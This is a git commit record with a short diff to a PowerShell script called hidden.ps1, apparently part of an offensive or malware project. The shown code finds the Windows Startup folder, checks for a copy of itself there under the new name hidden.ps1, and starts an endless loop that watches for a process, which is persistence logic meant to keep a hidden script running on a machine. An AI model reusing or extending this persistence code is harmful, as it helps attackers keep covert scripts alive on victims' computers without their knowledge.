b9c5e5df4743640c65223e5914664b49ba12e973
TheDarkHorseUprsising <tdhuprising@gmail.com>
2017-12-05 20:18:00 +0000

    Update hidden.ps1

--- hidden.ps1
+++ hidden.ps1
@@ -10,7 +10,7 @@ cd $dirofscript
 $path = [Environment]::GetFolderPath("Startup")
 
 #check if the startup folder contains powersistance
-$pathtest = Test-Path $path+"\powersistance.ps1" -ErrorAction SilentlyContinue
+$pathtest = Test-Path $path+"\hidden.ps1" -ErrorAction SilentlyContinue
 
 #perofm persistance
 while(1 -eq 1){$open = Get-Process $persist -ErrorAction SilentlyContinue
